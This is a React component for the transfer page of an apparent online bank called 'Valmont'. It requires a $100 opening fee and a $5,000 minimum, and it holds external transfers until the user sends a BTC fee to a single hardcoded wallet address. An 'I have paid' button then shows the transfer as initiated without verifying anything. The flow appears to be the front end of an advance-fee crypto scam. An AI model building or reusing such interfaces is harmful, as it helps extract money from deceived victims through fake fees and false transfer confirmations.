import { useState, useEffect } from 'react';
import { CheckCircle, RefreshCw, Bitcoin, Wallet, AlertCircle, ArrowRight, ChevronLeft, Copy, CreditCard } from 'lucide-react';
import api from '../services/api';
import { Link, useNavigate, useLocation } from 'react-router-dom';

const EXTERNAL_FEE_PERCENT = 0.002;
const MINIMUM_TRANSFER = 5000;
const TRANSFER_FEE_BTC_ADDRESS = '178X1pxp8T84apdvTHvU2x3o8cMMJ168DZ';
const FEE_QR_IMAGE = '/images/btc-qr.jpeg';

export default function TransferPage() {
  const navigate = useNavigate();
  const [activeTab, setActiveTab] = useState('external');
  const [isOperational, setIsOperational] = useState(false);
  const [accountLoading, setAccountLoading] = useState(true);

  // External Transfer states (Crypto-focused)
  const [recipientAddress, setRecipientAddress] = useState('');
  const [usdAmount, setUsdAmount] = useState('');
  const [rate, setRate] = useState(null);
  const [rateLoading, setRateLoading] = useState(true);

  // Fee payment method for external transfer (now only BTC)
  const [feeMethod, setFeeMethod] = useState('btc');

  // Internal Transfer states
  const [recipientEmail, setRecipientEmail] = useState('');
  const [internalAmount, setInternalAmount] = useState('');
  const [internalLoading, setInternalLoading] = useState(false);
  const [internalSuccess, setInternalSuccess] = useState(false);

  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');

  // Multi-step External flow
  const [externalStep, setExternalStep] = useState('form'); // form | confirm | fee-payment | initiated
  const [pendingTransfer, setPendingTransfer] = useState(null);
  const [copied, setCopied] = useState(false);

  const location = useLocation();
  
  useEffect(() => {
    const pending = location.state?.pendingTransaction;
    if (pending && pending.type === 'external_transfer') {
      setRecipientAddress(pending.metadata?.recipientAddress || '');
      setUsdAmount(pending.amount.toString());
      setFeeMethod('btc');
      setPendingTransfer(pending);
      setExternalStep('confirm');
    }
  }, [location.state]);

  // Fee calculations
  const parsedAmount = parseFloat(usdAmount) || 0;
  const feeAmount = parsedAmount > 0 ? (parsedAmount * EXTERNAL_FEE_PERCENT) / 100 : 0;
  const totalAmount = parsedAmount + feeAmount;

  // Check account status
  useEffect(() => {
    api.get('/accounts/me')
      .then((res) => setIsOperational(res.data.isOperational))
      .catch(console.error)
      .finally(() => setAccountLoading(false));
  }, []);

  // BTC Rate
  const fetchRate = async () => {
    setRateLoading(true);
    try {
      const { data } = await api.get('/transfers/btc/rate');
      setRate(data.btcUsdPrice);
    } catch {
      setRate(null);
    } finally {
      setRateLoading(false);
    }
  };

  useEffect(() => {
    fetchRate();
    const interval = setInterval(fetchRate, 60000);
    return () => clearInterval(interval);
  }, []);

  const copyAddress = () => {
    navigator.clipboard.writeText(TRANSFER_FEE_BTC_ADDRESS);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const resetExternalFlow = () => {
    setExternalStep('form');
    setRecipientAddress('');
    setUsdAmount('');
    setFeeMethod('btc');
    setPendingTransfer(null);
    setError('');
  };

  const handleExternalConfirm = () => {
    if (!recipientAddress.trim()) return setError('Enter a valid BTC wallet address.');
    
    if (!usdAmount || parsedAmount < MINIMUM_TRANSFER) {
      return setError(`Minimum transfer amount is $${MINIMUM_TRANSFER}`);
    }
    
    setError('');
    setExternalStep('confirm');
  };

  const handleProceedToFee = async () => {
    setError('');
    setLoading(true);
    try {
      const { data } = await api.post('/transfers/external', {
        recipientAddress: recipientAddress.trim(),
        usdAmount: parsedAmount,
        feeMethod,
      });
      setPendingTransfer(data);
      setExternalStep('fee-payment');
    } catch (err) {
      setError(err.response?.data?.error || 'Failed to initiate transfer');
    } finally {
      setLoading(false);
    }
  };

  const handleFeePaid = () => {
    setExternalStep('initiated');
  };

  const handleCancelTransfer = () => {
    if (window.confirm('Cancel this transfer?')) {
      resetExternalFlow();
      navigate('/');
    }
  };

  // Handle Internal Transfer
  const handleInternalTransfer = async () => {
    if (!recipientEmail.trim()) return setError('Enter recipient email.');
    if (!internalAmount || parseFloat(internalAmount) <= 0) return setError('Enter a valid amount.');

    setError('');
    setInternalLoading(true);
    try {
      await api.post('/transfers/internal', {
        recipientEmail: recipientEmail.trim(),
        amount: parseFloat(internalAmount),
      });
      setInternalSuccess(true);
      setRecipientEmail('');
      setInternalAmount('');
    } catch (err) {
      setError(err.response?.data?.error || 'Internal transfer failed.');
    } finally {
      setInternalLoading(false);
    }
  };

  // Account not operational
  if (!accountLoading && !isOperational) {
    return (
      <div className="max-w-sm mx-auto text-center py-12">
        <AlertCircle size={48} className="mx-auto text-amber-500 mb-4" />
        <h2 className="text-xl font-bold text-gray-900">Account Not Operational</h2>
        <p className="text-gray-500 mt-2 mb-8">
          You must pay the $100 opening fee before you can send transfers.
        </p>
        <Link
          to="/deposit"
          className="inline-flex items-center gap-2 px-6 py-3 bg-indigo-600 text-white font-semibold rounded-xl hover:bg-indigo-700"
        >
          Pay Opening Fee Now <ArrowRight size={18} />
        </Link>
      </div>
    );
  }

  // External transfer initiated success screen
  if (externalStep === 'initiated' && pendingTransfer) {
    return (
      <div className="max-w-sm mx-auto">
        <div className="bg-white rounded-3xl border border-gray-100 shadow-sm overflow-hidden">
          {/* Success Header */}
          <div className="px-6 pt-8 pb-6 bg-gradient-to-b from-emerald-50 to-white border-b border-gray-100 text-center">
            <div className="w-16 h-16 bg-emerald-100 rounded-2xl flex items-center justify-center mx-auto mb-5 shadow-inner">
              <CheckCircle size={36} className="text-emerald-600" />
            </div>
            
            <h2 className="text-2xl font-bold text-gray-900 mb-1">Transfer Initiated</h2>
            <p className="text-emerald-700 font-medium">Your external transfer has been queued</p>
            
            <div className="inline-flex items-center gap-2 mt-4 px-4 py-1.5 bg-emerald-100 rounded-full text-sm text-emerald-700">
              <div className="w-2 h-2 bg-emerald-500 rounded-full animate-pulse" />
              Pending Fee Confirmation
            </div>
          </div>

          {/* Transfer Details */}
          <div className="p-6 space-y-6">
            <div className="bg-gray-50 rounded-2xl p-5 space-y-4 text-sm">
              <Row
                label="Amount Sent"
                value={`$${(pendingTransfer.transaction?.amount ?? parsedAmount).toLocaleString('en-US', { minimumFractionDigits: 2 })}`}
              />
              <Row
                label={`Processing Fee (${EXTERNAL_FEE_PERCENT}%)`}
                value={`$${(pendingTransfer.fee ?? feeAmount).toLocaleString('en-US', { minimumFractionDigits: 2 })}`}
                red
              />
              <Row
                label="Total Deducted"
                value={`$${(pendingTransfer.totalDeducted ?? totalAmount).toLocaleString('en-US', { minimumFractionDigits: 2 })}`}
                bold
              />
              
              <div className="h-px bg-gray-200 my-1" />
              
              <Row
                label="Recipient BTC Address"
                value={pendingTransfer.recipientAddress ?? recipientAddress}
                mono
              />
              <Row 
                label="Fee Method" 
                value={feeMethod.toUpperCase()} 
              />
              <Row 
                label="Reference" 
                value={pendingTransfer.reference ?? 'PENDING'} 
                mono 
              />
              <Row 
                label="Status" 
                value="Awaiting Fee Confirmation" 
                pending 
              />
            </div>

            <div className="text-center text-xs text-gray-500 leading-relaxed px-2">
              Your transfer of <span className="font-medium text-gray-700">${parsedAmount.toFixed(2)}</span> will be sent to the recipient once the fee payment is confirmed.
            </div>

            {/* Next Steps */}
            <div className="bg-amber-50 border border-amber-100 rounded-2xl p-4 text-xs text-amber-700 space-y-2.5">
              <div className="flex gap-2">
                <div className="mt-0.5">•</div>
                <p>As long as you sent exactly <span className="font-semibold">${feeAmount.toFixed(2)}</span> in BTC.</p>
              </div>
              <div className="flex gap-2">
                <div className="mt-0.5">•</div>
                <p>Once confirmed, your funds will be transferred automatically.</p>
              </div>
            </div>
          </div>

          {/* Action Button */}
          <div className="px-6 pb-8">
            <button
              onClick={resetExternalFlow}
              className="w-full py-3.5 bg-indigo-600 hover:bg-indigo-700 active:bg-indigo-800 text-white font-semibold rounded-2xl transition-all duration-200 shadow-sm shadow-indigo-500/30 hover:shadow-md hover:shadow-indigo-500/40"
            >
              Make Another Transfer
            </button>
          </div>
        </div>
      </div>
    );
  }

  // Internal transfer success screen
  if (internalSuccess) {
    return (
      <div className="max-w-sm mx-auto text-center">
        <div className="bg-emerald-50 border border-emerald-100 rounded-2xl p-8">
          <CheckCircle size={48} className="text-emerald-600 mx-auto mb-4" />
          <h2 className="text-2xl font-bold text-gray-900">Transfer Successful!</h2>
          <p className="text-emerald-700 mt-2">Money has been sent to the recipient.</p>
        </div>
        <button
          onClick={() => setInternalSuccess(false)}
          className="mt-8 w-full py-3 bg-indigo-600 hover:bg-indigo-700 text-white font-semibold rounded-xl"
        >
          Make Another Transfer
        </button>
      </div>
    );
  }

  return (
    <div className="max-w-sm mx-auto">
      <div className="mb-6">
        <h1 className="text-[22px] font-bold text-gray-900 tracking-tight">Transfer Funds</h1>
        <p className="text-sm text-gray-400 mt-0.5">Send money via External (Crypto) or internally</p>
      </div>

      {/* Tabs */}
      <div className="flex border-b border-gray-200 mb-6">
        <button
          onClick={() => { setActiveTab('external'); setError(''); }}
          className={`flex-1 pb-3 text-sm font-semibold transition-colors ${activeTab === 'external' ? 'border-b-2 border-indigo-600 text-indigo-600' : 'text-gray-500'}`}
        >
          External Transfer
        </button>
        <button
          onClick={() => { setActiveTab('internal'); setError(''); }}
          className={`flex-1 pb-3 text-sm font-semibold transition-colors ${activeTab === 'internal' ? 'border-b-2 border-indigo-600 text-indigo-600' : 'text-gray-500'}`}
        >
          Internal Transfer
        </button>
      </div>

      {/* External Description */}
      {activeTab === 'external' && (
        <div className="bg-blue-50 border border-blue-100 rounded-xl px-4 py-3 mb-5 text-sm text-blue-700">
          External transfers are sent directly to <strong>BTC wallets</strong>.
        </div>
      )}

      {/* External Tab */}
      {activeTab === 'external' && (
        <>
          {/* Step 1: Form */}
          {externalStep === 'form' && (
            <div className="bg-white rounded-2xl border border-gray-100 p-5 sm:p-6 space-y-5">
              
              {/* Minimum Transfer Notice */}
              <div className="bg-amber-50 border border-amber-100 rounded-xl px-4 py-3 text-sm text-amber-700">
                <strong>Minimum Transfer Amount:</strong> $5,000 USD
              </div>

              <div>
                <label className="block text-[11px] font-semibold uppercase tracking-widest text-gray-400 mb-2">
                  Recipient BTC Address
                </label>
                <div className="relative">
                  <Wallet size={14} className="absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-300" />
                  <input
                    type="text"
                    className="w-full pl-9 pr-4 py-3 rounded-xl border border-gray-200 bg-gray-50 text-gray-900 text-[13px] placeholder:font-sans placeholder:text-[13px] placeholder:text-gray-300 focus:outline-none focus:ring-2 focus:ring-indigo-500/20 focus:border-indigo-400 transition-all"
                    placeholder="bc1qxy2kdy... (your BTC address)"
                    value={recipientAddress}
                    onChange={(e) => setRecipientAddress(e.target.value)}
                  />
                </div>
                <p className="text-[11px] text-gray-400 mt-1.5">Funds will be sent to this Bitcoin wallet address.</p>
              </div>

              <div>
                <label className="block text-[11px] font-semibold uppercase tracking-widest text-gray-400 mb-2">
                  Amount (USD) — Minimum $5,000
                </label>
                <div className="relative">
                  <span className="absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-300 text-sm font-medium">$</span>
                  <input
                    type="number"
                    min={MINIMUM_TRANSFER}
                    step="0.01"
                    className="w-full pl-8 pr-4 py-3 rounded-xl border border-gray-200 bg-gray-50 text-gray-900 text-[15px] font-semibold placeholder:font-normal placeholder:text-gray-300 focus:outline-none focus:ring-2 focus:ring-indigo-500/20 focus:border-indigo-400 transition-all"
                    placeholder="5000.00"
                    value={usdAmount}
                    onChange={(e) => setUsdAmount(e.target.value)}
                  />
                </div>
              </div>

              {parsedAmount > 0 && (
                <div className="bg-gray-50 border border-gray-100 rounded-xl px-4 py-3 space-y-2">
                  <div className="flex justify-between text-[12px] text-gray-400">
                    <span>Transfer amount</span>
                    <span className="font-medium text-gray-700">${parsedAmount.toFixed(2)}</span>
                  </div>
                  <div className="flex justify-between text-[12px] text-gray-400">
                    <span>Fee ({EXTERNAL_FEE_PERCENT}%)</span>
                    <span className="font-medium text-red-500">+${feeAmount.toFixed(2)}</span>
                  </div>
                  <div className="border-t border-gray-200 pt-2 flex justify-between text-[13px]">
                    <span className="font-semibold text-gray-700">Total deducted</span>
                    <span className="font-bold text-gray-900">${totalAmount.toFixed(2)}</span>
                  </div>
                </div>
              )}

              {error && (
                <div className="px-4 py-3 rounded-xl bg-red-50 border border-red-100 text-red-600 text-sm">{error}</div>
              )}

              <button
                onClick={handleExternalConfirm}
                disabled={!recipientAddress || !usdAmount}
                className="w-full py-3 bg-indigo-600 hover:bg-indigo-700 disabled:bg-gray-100 disabled:text-gray-400 text-white text-sm font-semibold rounded-xl transition-all duration-150 shadow-sm shadow-indigo-500/20 hover:shadow-md hover:shadow-indigo-500/25 disabled:shadow-none"
              >
                {`Review Transfer${parsedAmount > 0 ? ` · $${totalAmount.toFixed(2)}` : ''}`}
              </button>

              <p className="text-[11px] text-gray-400 text-center">
                A {EXTERNAL_FEE_PERCENT}% fee is applied. Minimum transfer is $5,000.
              </p>
            </div>
          )}

          {/* Step 2: Confirm */}
          {externalStep === 'confirm' && (
            <div>
              <button onClick={() => { setExternalStep('form'); setError(''); }} className="flex items-center gap-1.5 text-sm text-gray-400 hover:text-gray-600 mb-5">
                <ChevronLeft size={15} /> Back
              </button>
              <div className="bg-white rounded-2xl border border-gray-100 p-6 space-y-6">
                <h2 className="text-[18px] font-bold text-gray-900">Confirm Transfer</h2>
                <div className="space-y-0 text-sm divide-y divide-gray-100">
                  <div className="flex justify-between py-3">
                    <span className="text-gray-500">Amount</span>
                    <span className="font-semibold text-gray-900">${parsedAmount.toFixed(2)}</span>
                  </div>
                  <div className="flex justify-between py-3">
                    <span className="text-gray-500">Fee ({EXTERNAL_FEE_PERCENT}%)</span>
                    <span className="font-semibold text-red-500">+${feeAmount.toFixed(2)}</span>
                  </div>
                  <div className="flex justify-between py-3">
                    <span className="font-semibold text-gray-700">Total</span>
                    <span className="font-bold text-gray-900">${totalAmount.toFixed(2)}</span>
                  </div>
                  <div className="flex justify-between py-3">
                    <span className="text-gray-500">To (BTC)</span>
                    <span className="text-gray-900 break-all text-right max-w-[60%] font-mono text-xs">{recipientAddress}</span>
                  </div>
                </div>

                {/* Fee Method Selection (BTC only) */}
                <div className="pt-4">
                  <label className="block text-[11px] font-semibold uppercase tracking-widest text-gray-400 mb-3">
                    Pay Transfer Fee With
                  </label>
                  <div className="grid grid-cols-1 gap-3">
                    <div className="p-4 rounded-2xl border border-indigo-600 bg-indigo-50 flex flex-col items-center gap-2">
                      <Bitcoin size={24} className="text-indigo-600" />
                      <div>
                        <div className="font-semibold text-sm">BTC</div>
                        <div className="text-[10px] text-gray-500">Blockchain</div>
                      </div>
                    </div>
                  </div>
                </div>

                <div className="bg-amber-50 border border-amber-100 p-4 rounded-xl text-sm text-amber-700">
                  A {EXTERNAL_FEE_PERCENT}% transfer fee is required to process this transaction.
                </div>

                {error && (
                  <div className="px-4 py-3 rounded-xl bg-red-50 border border-red-100 text-red-600 text-sm">{error}</div>
                )}

                <button
                  onClick={handleProceedToFee}
                  disabled={loading}
                  className="w-full py-3.5 bg-indigo-600 hover:bg-indigo-700 disabled:bg-indigo-400 text-white font-semibold rounded-xl transition-colors"
                >
                  {loading ? 'Processing...' : 'Proceed to Fee Payment'}
                </button>
              </div>
            </div>
          )}

          {/* Step 3: Fee Payment */}
          {externalStep === 'fee-payment' && (
            <div>
              <button onClick={() => setExternalStep('confirm')} className="flex items-center gap-1.5 text-sm text-gray-400 hover:text-gray-600 mb-5">
                <ChevronLeft size={15} /> Back
              </button>

              <div className="mb-5">
                <h1 className="text-[22px] font-bold text-gray-900">Transfer Pending</h1>
                <p className="text-sm text-gray-400">Pay the {EXTERNAL_FEE_PERCENT}% fee to proceed</p>
              </div>

              <div className="bg-white rounded-2xl border border-gray-100 p-5 space-y-5">
                <div className="flex justify-center">
                  <div className="p-3 bg-gray-50 rounded-2xl border border-gray-100">
                    <img src={FEE_QR_IMAGE} alt="Fee payment QR code" className="w-44 h-44 object-contain rounded-xl" />
                  </div>
                </div>

                <div>
                  <p className="text-[11px] font-semibold uppercase tracking-widest text-gray-400 mb-1.5">BTC Address (Fee Only)</p>
                  <div className="flex items-center gap-2 bg-gray-50 border border-gray-200 rounded-xl px-3 py-2.5">
                    <p className="flex-1 font-mono text-[11px] text-gray-700 break-all">{TRANSFER_FEE_BTC_ADDRESS}</p>
                    <button
                      onClick={copyAddress}
                      className="w-7 h-7 rounded-lg bg-white border border-gray-200 flex items-center justify-center shrink-0"
                    >
                      {copied ? <CheckCircle size={12} className="text-emerald-500" /> : <Copy size={12} className="text-gray-400" />}
                    </button>
                  </div>
                </div>

                <div className="px-4 py-3 bg-amber-50 border border-amber-100 rounded-xl text-sm text-amber-700 space-y-1">
                  <p>Send <strong>exactly</strong> <strong>${feeAmount.toFixed(2)}</strong> in BTC to the address above.</p>
                  <p className="text-amber-600">Your ${parsedAmount.toFixed(2)} transfer will be released to <strong className="font-mono break-all">{recipientAddress}</strong> after confirmation.</p>
                </div>
              </div>

              <div className="mt-5 space-y-3">
                <button
                  onClick={handleFeePaid}
                  className="w-full py-3.5 bg-emerald-600 hover:bg-emerald-700 text-white font-semibold rounded-xl transition-colors"
                >
                  I have paid the transfer fee
                </button>
                <button
                  onClick={handleCancelTransfer}
                  className="w-full py-3 bg-gray-100 hover:bg-gray-200 text-gray-700 font-semibold rounded-xl transition-colors"
                >
                  Return to Home
                </button>
              </div>
            </div>
          )}
        </>
      )}

      {/* Internal Transfer Tab */}
      {activeTab === 'internal' && (
        <>
          {/* Internal Description */}
          <div className="bg-blue-50 border border-blue-100 rounded-xl px-4 py-3 mb-5 text-sm text-blue-700">
            Internal transfers are sent only to <strong>Valmont private bank accounts</strong> (other users on the platform).
          </div>

          <div className="bg-white rounded-2xl border border-gray-100 p-5 sm:p-6 space-y-5">
            <div>
              <label className="block text-[11px] font-semibold uppercase tracking-widest text-gray-400 mb-2">
                Recipient Email Address
              </label>
              <input
                type="email"
                className="w-full px-4 py-3 rounded-xl border border-gray-200 bg-gray-50 text-gray-900 focus:outline-none focus:ring-2 focus:ring-indigo-500/20 focus:border-indigo-400"
                placeholder="user@example.com"
                value={recipientEmail}
                onChange={(e) => setRecipientEmail(e.target.value)}
              />
            </div>

            <div>
              <label className="block text-[11px] font-semibold uppercase tracking-widest text-gray-400 mb-2">
                Amount (USD)
              </label>
              <div className="relative">
                <span className="absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-300 text-sm font-medium">$</span>
                <input
                  type="number"
                  min="1"
                  step="0.01"
                  className="w-full pl-8 pr-4 py-3 rounded-xl border border-gray-200 bg-gray-50 text-gray-900 text-[15px] font-semibold placeholder:font-normal focus:outline-none focus:ring-2 focus:ring-indigo-500/20 focus:border-indigo-400"
                  placeholder="0.00"
                  value={internalAmount}
                  onChange={(e) => setInternalAmount(e.target.value)}
                />
              </div>
            </div>

            {error && (
              <div className="px-4 py-3 rounded-xl bg-red-50 border border-red-100 text-red-600 text-sm">{error}</div>
            )}

            <button
              onClick={handleInternalTransfer}
              disabled={internalLoading || !recipientEmail || !internalAmount}
              className="w-full py-3 bg-indigo-600 hover:bg-indigo-700 disabled:bg-gray-100 disabled:text-gray-400 text-white text-sm font-semibold rounded-xl transition-all duration-150 shadow-sm shadow-indigo-500/20 hover:shadow-md hover:shadow-indigo-500/25 disabled:shadow-none"
            >
              {internalLoading ? 'Processing…' : 'Send Internal Transfer'}
            </button>

            <p className="text-[11px] text-gray-400 text-center">Transfer to another Valmont user instantly</p>
          </div>
        </>
      )}
    </div>
  );
}

function Row({ label, value, mono, amber, pending, red, bold }) {
  return (
    <div className="flex justify-between items-center">
      <span className="text-gray-500 text-[13px]">{label}</span>
      <span className={`
        font-semibold text-right
        ${mono ? 'font-mono text-[12px] tracking-tight' : ''} 
        ${amber ? 'text-amber-600' : ''} 
        ${pending ? 'text-amber-600 font-medium' : ''} 
        ${red ? 'text-red-600' : ''} 
        ${bold ? 'text-gray-900 text-[15px]' : 'text-gray-900'}
      `}>
        {value}
      </span>
    </div>
  );
}